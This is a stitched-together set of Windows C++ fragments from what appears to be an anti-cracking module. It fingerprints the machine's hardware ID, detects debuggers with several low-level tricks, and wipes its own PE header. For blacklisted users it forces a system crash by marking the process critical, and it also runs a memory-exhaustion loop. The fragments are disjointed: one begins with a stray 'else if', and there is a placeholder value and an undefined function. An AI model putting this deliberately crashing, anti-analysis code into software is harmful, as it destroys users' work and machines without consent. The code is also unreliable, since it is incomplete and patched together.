void getHWID()
{
	// GetVolumeInformationA
	DWORD DriveSerial;
 
	// GetComputerNameA
	TCHAR ComputerName[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD size = sizeof(ComputerName) / sizeof(ComputerName[0]);
	// OS GUID
	HW_PROFILE_INFO hwProfileInfo;
	DWORD OsGUID;
	GetVolumeInformationA(0, nullptr, '\0', &DriveSerial, nullptr, nullptr, nullptr, 0);
	GetComputerNameA(ComputerName, &size);
	GetCurrentHwProfileA(&hwProfileInfo);
	memcpy(&OsGUID, &hwProfileInfo.szHwProfileGuid, sizeof(hwProfileInfo.szHwProfileGuid));
	//UserDriveSerial = to_string(DriveSerial);
	UserComputerName = ComputerName;
	UserOsGUID = to_string(OsGUID);
	string Messer = "2134[sl";
	UserCombineHWID = Messer + UserComputerName + UserOsGUID;
}


#define A 54059
#define B 45963
#define C 86264
#define FIRSTH 37
using namespace std;
unsigned hash_str(const char* s)
{
	unsigned h = FIRSTH;
	while (*s) {
		h = (h * A) ^ (s[0] * B);
		s++;
	}
	return h; // or return h % C;
}


void SelfDestruct()
{
	std::vector<char*> explosion;
	while (true)
		explosion.push_back(new char[10000]);
}

bool HasHardwareBreakpoints()
{
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	auto hThread = GetCurrentThread();
	if (GetThreadContext(hThread, &ctx) == 0)
		return false;
	return (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0);
}
bool DebuggerDriversPresent()
{
	// an array of common debugger driver device names
	const char drivers[9][20] = {
		"\\\\.\\EXTREM", "\\\\.\\ICEEXT",
		"\\\\.\\NDBGMSG.VXD", "\\\\.\\RING0",
		"\\\\.\\SIWVID", "\\\\.\\SYSER",
		"\\\\.\\TRW", "\\\\.\\SYSERBOOT",
		"\0"
	};
	for (int i = 0; drivers[i][0] != '\0'; i++) {
		auto h = CreateFileA(drivers[i], 0, 0, 0, OPEN_EXISTING, 0, 0);
		if (h != INVALID_HANDLE_VALUE)
		{
			CloseHandle(h);
			return true;
		}
	}
	return false;
}
inline bool IsDbgPresentPrefixCheck()
{
	__try
	{
		__asm __emit 0xF3 // 0xF3 0x64 disassembles as PREFIX REP:
		__asm __emit 0x64
		__asm __emit 0xF1 // One byte INT 1
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return false;
	}
 
	return true;
}
inline bool Int2DCheck()
{
	__try
	{
		__asm
		{
			int 0x2d
			xor eax, eax
			add eax, 2
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return false;
	}
 
	return true;
}
inline bool Has2DBreakpointHandler()
{
	__try { __asm INT 0x2D }
	__except (EXCEPTION_EXECUTE_HANDLER) { return false; }
	return true;
}
inline bool Has03BreakpointHandler()
{
	__try { __asm INT 0x03 }
	__except (EXCEPTION_EXECUTE_HANDLER) { return false; }
	return true;
}
inline void ErasePEHeaderFromMemory()
{
	DWORD OldProtect = 0;
 
	// Get base address of module
	char *pBaseAddr = (char*)GetModuleHandle(NULL);
 
	// Change memory protection
	VirtualProtect(pBaseAddr, 4096, // Assume x86 page size
		PAGE_READWRITE, &OldProtect);
 
	// Erase the header
	ZeroMemory(pBaseAddr, 4096);
}
void CheckForDebuggers()
{
	if (HasHardwareBreakpoints() || DebuggerDriversPresent() || HasHardwareBreakpoints() || IsDbgPresentPrefixCheck() || Has2DBreakpointHandler() || Int2DCheck() || Has03BreakpointHandler() || IsDebuggerPresent())
	{
		ErasePEHeaderFromMemory();
		recurse1();
		//DebugSelf();
		SelfDestruct();
		OutputDebugString("%s%s%s%s");
		exit(1);
	}
}


else if (hash_str(UserCombineHWID.c_str()) == <BlackListedShitters>)
	{
		BSODBaby();
		recurse1();
		SelfDestruct();
		exit(1);
	}
  
  
  void BSODBaby()
{
	typedef long (WINAPI *RtlSetProcessIsCritical)
		(BOOLEAN New, BOOLEAN *Old, BOOLEAN NeedScb);
	auto ntdll = LoadLibraryA("ntdll.dll");
	if (ntdll) {
		auto SetProcessIsCritical = (RtlSetProcessIsCritical)
			GetProcAddress(ntdll, "RtlSetProcessIsCritical");
		if (SetProcessIsCritical)
			SetProcessIsCritical(1, 0, 0);
	}
}
